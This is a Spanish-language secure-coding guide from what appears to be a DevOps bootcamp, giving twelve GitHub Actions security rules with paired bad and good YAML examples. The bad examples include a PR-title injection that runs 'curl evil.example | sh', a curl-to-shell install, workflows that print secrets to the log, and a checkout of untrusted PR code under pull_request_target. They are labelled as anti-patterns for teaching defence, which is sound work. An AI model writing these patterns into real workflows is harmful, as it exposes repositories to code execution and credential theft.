# 🔐 Reglas de seguridad de workflows

Un workflow es **código que se ejecuta con tus credenciales cada vez que alguien hace push o abre
un PR**. Estas doce reglas se aplican a todo lo que escribes en el bootcamp desde la Semana 01. La
Semana 12 explica a fondo el porqué de cada una. Aquí tienes la versión corta: qué no hacer, qué
hacer y en qué semana se ve.

Los ejemplos malos llevan el comentario `# antipatron` para que `check-repo.sh` no los
marque como error. Tú no lo pongas en tu código: en tu código no hay antipatrones.

---

## 1. Toda `uses:` remota fijada por SHA

Un tag como `v7` se puede mover a otro commit. Si la action se compromete, tu próximo run ejecuta
el código del atacante con tu token. Un SHA de 40 caracteres es inmutable.

```yaml
# ❌ Mal: el tag puede apuntar mañana a otro código
- uses: actions/checkout@v7   # antipatron

# ✅ Bien: SHA resuelto con scripts/resolve-sha.sh y el tag en comentario para humanos y Dependabot
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
```

Exentas: las referencias al propio repo (`./ruta` y `$/ruta`), que no salen de él, y las
imágenes `docker://` fijadas por digest.

Se aprende en la **S01** y se profundiza en la **S11** (versionado) y la **S12** (cadena de
dependencias).

## 2. `permissions:` mínimos en la raíz

Sin `permissions:`, el `GITHUB_TOKEN` recibe los permisos por defecto de la org o del repo, que
pueden ser de escritura. Declara lo mínimo arriba y sube solo en el job que lo necesita.

```yaml
# ❌ Mal: el token puede escribir en todo el repo
permissions: write-all   # antipatron

# ✅ Bien: solo lectura por defecto; el job de publicación pide lo suyo
permissions:
  contents: read

jobs:
  publish:
    permissions:
      contents: read
      packages: write
```

Se usa desde la **S01**; se profundiza en la **S12**.

## 3. `runs-on: ubuntu-24.04`, nunca `-latest`

`ubuntu-latest` cambia de imagen cuando GitHub decide. Un día tu pipeline falla sin que hayas <!-- antipatron -->
tocado nada, y no sabes por qué.

```yaml
runs-on: ubuntu-latest   # antipatron
runs-on: ubuntu-24.04    # ✅
```

Desde la **S01**.

## 4. Los datos no confiables llegan al shell por `env:`

GitHub sustituye `${{ ... }}` **antes** de que el shell lea el script. Si el valor lo controla otra
persona (el título de un PR, el nombre de una rama), puede cerrar tu comando y escribir el suyo.

```yaml
# ❌ Mal: un PR titulado  a"; curl evil.example | sh; echo "  ejecuta código
- run: echo "Título: ${{ github.event.pull_request.title }}"   # antipatron

# ✅ Bien: el valor llega como variable de entorno y el shell lo trata como dato
- env:
    TITULO: ${{ github.event.pull_request.title }}
  run: echo "Título: $TITULO"
```

Se ve en la **S02** (cuándo se evalúa cada cosa) y a fondo en la **S12**.

## 5. `persist-credentials: false` en checkout

Por defecto `actions/checkout` deja el token configurado en git para el resto del job (desde la
v6, en un archivo bajo `$RUNNER_TEMP` en lugar de `.git/config`).
Cualquier step posterior, incluida una action de terceros, puede leerlo.

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

Si el job tiene que hacer `git push`, se quita y se explica en un comentario. Desde la **S01**.

## 6. `pull_request_target` y `workflow_run` solo con el patrón seguro

`pull_request_target` corre con los secretos y el token de escritura del repo base. Si dentro haces
checkout del código del PR, ejecutas código de un desconocido con tus secretos (*pwn request*).

```yaml
# ❌ Mal
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # antipatron
      - run: make test
```

El patrón seguro (sin checkout del head, o con dos workflows separados por `workflow_run` y
artefactos tratados como datos) se ve en la **S12**. Antes de esa semana no se usa.

## 7. Ningún secreto en el log

GitHub enmascara los secretos que conoce, pero no sus transformaciones (base64, un trozo, un JSON).

```yaml
- run: echo '${{ toJSON(secrets) }}'      # antipatron
- run: echo "$TOKEN" | base64             # antipatron
```

Las credenciales que solo existen en CI (la contraseña de PostgreSQL del service container) valen
`cambiame` y se dice que son desechables. Se ve en la **S05** y la **S13**.

## 8. `timeout-minutes` y `concurrency`

Un job colgado consume hasta el límite de la plataforma. Dos despliegues a la vez dejan el entorno
en un estado que nadie pidió.

```yaml
concurrency:
  group: deploy-production
  cancel-in-progress: false   # un despliegue nunca se cancela a medias

jobs:
  deploy:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
```

Obligatorio desde la **S07**.

## 9. Herramientas con versión y checksum

```yaml
# ❌ Mal: ejecuta lo que el servidor mande hoy
- run: curl -sSfL https://example.com/install.sh | sh   # antipatron

# ✅ Bien: versión fija y checksum verificado; si no cuadra, el step falla
- run: |
    curl -fsSLO "https://github.com/rhysd/actionlint/releases/download/v1.7.12/actionlint_1.7.12_linux_amd64.tar.gz"
    curl -fsSLO "https://github.com/rhysd/actionlint/releases/download/v1.7.12/actionlint_1.7.12_checksums.txt"
    grep ' actionlint_1.7.12_linux_amd64.tar.gz$' actionlint_1.7.12_checksums.txt | sha256sum -c
```

Las herramientas de Python se instalan con `uv tool install <paquete>==<versión>`. Desde la **S01**.

## 10. Imágenes con tag completo y, al desplegar, por digest

```yaml
services:
  postgres:
    image: postgres            # antipatron
    image: postgres:latest     # antipatron
    image: postgres:17.11-alpine   # ✅
```

Desde la **S14** lo que se despliega se referencia por digest
(`ghcr.io/<tu-org>/tablero-api@sha256:…`), porque un tag también se puede mover.

## 11. Runner propio blindado

Un runner propio en un repo público ejecuta en **tu máquina** lo que diga el workflow. Cuatro
medidas, todas obligatorias:

1. Efímero (JIT o ARC): un job y se destruye.
2. Que solo `tablero` pueda usarlo: runner registrado en el repositorio y la política de runners
   de repositorio de la org limitada a `tablero`. En el plan Team, un runner group con
   `visibility: selected`.
3. Jobs `self-hosted` solo en `push` a `main`, `workflow_dispatch` o un environment protegido.
   Nunca en `pull_request`.
4. Aprobación obligatoria de workflows para todos los contribuidores externos.

Se ve en la **S15** y la **S16**.

## 12. Nada expuesto a la red pública

```yaml
ports:
  - "8000:8000"             # antipatron
  - "127.0.0.1:8000:8000"   # ✅
```

Aplica a Compose (S05) y a kind (S16).

---

## Cómo se comprueban

| Regla | Herramienta |
|---|---|
| 1, 3, 10, 12 | `scripts/check-repo.sh` (comprobaciones 9-11) y `checks.json` de cada semana |
| 2, 4, 5, 6, 7 | `zizmor` (S08 en adelante) |
| Sintaxis de todo lo anterior | `actionlint` (S01 en adelante) |
| 8, 9, 11 | Rúbrica manual de cada semana y `checks.json` de S07, S15 y S16 |

---

| ← Anterior | Siguiente → |
|:---|---:|
| [Mapa de funcionalidades](mapa-funcionalidades.md) | [Versiones del stack](stack-versions.md) |
